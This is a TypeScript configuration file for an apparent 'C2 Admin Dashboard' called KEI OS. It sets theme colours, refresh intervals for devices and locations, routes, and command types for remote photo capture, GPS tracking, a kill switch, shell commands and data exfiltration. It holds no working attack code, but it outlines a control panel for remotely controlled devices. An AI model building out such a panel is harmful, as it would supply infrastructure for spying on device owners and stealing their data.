/**
 * Application constants and configuration
 */

export const APP_CONFIG = {
  // App Metadata
  appName: 'KEI OS',
  appTitle: 'KEI OS - C2 Admin Dashboard',
  appDescription: 'Professional-grade Command & Control Admin Terminal',
  version: '1.0.0',

  // Theme
  theme: {
    primary: '#0a0b10',
    secondary: '#161b22',
    accent: '#00ff41',
    accentHover: '#00dd33',
  },

  // Feature Flags
  features: {
    interactiveMap: true,
    commandExecution: true,
    systemLogs: true,
    realTimeSync: true,
    authenticationRequired: true,
  },

  // Firebase
  firebase: {
    projectId: 'kei-project-cbbc4',
  },

  // Pagination
  pagination: {
    itemsPerPage: 20,
    maxLogEntries: 500,
  },

  // Refresh Intervals (ms)
  refresh: {
    devices: 5000,
    locations: 10000,
    logs: 2000,
    stats: 5000,
  },

  // UI Defaults
  ui: {
    sidebarWidth: 'w-64',
    animationDuration: 300,
    toastDuration: 3000,
  },

  // Device Status
  deviceStatus: {
    online: 'online',
    offline: 'offline',
    idle: 'idle',
    active: 'active',
  } as const,

  // Command Types
  commands: {
    photo: 'photo',
    cpGps: 'gps_sync',
    killSwitch: 'kill_switch',
    shellCommand: 'shell_command',
    dataExfil: 'data_exfil',
  } as const,

  // Log Types
  logTypes: {
    info: 'info',
    warning: 'warning',
    error: 'error',
    success: 'success',
    command: 'command',
  } as const,

  // Routes
  routes: {
    home: '/',
    login: '/auth/login',
    dashboard: '/dashboard',
    commandCenter: '/dashboard/command-center',
    map: '/dashboard/map',
    terminal: '/dashboard/terminal',
    logs: '/dashboard/logs',
  } as const,
};

// Type-safe constants
export type DeviceStatus = typeof APP_CONFIG.deviceStatus[keyof typeof APP_CONFIG.deviceStatus];
export type CommandType = typeof APP_CONFIG.commands[keyof typeof APP_CONFIG.commands];
export type LogType = typeof APP_CONFIG.logTypes[keyof typeof APP_CONFIG.logTypes];
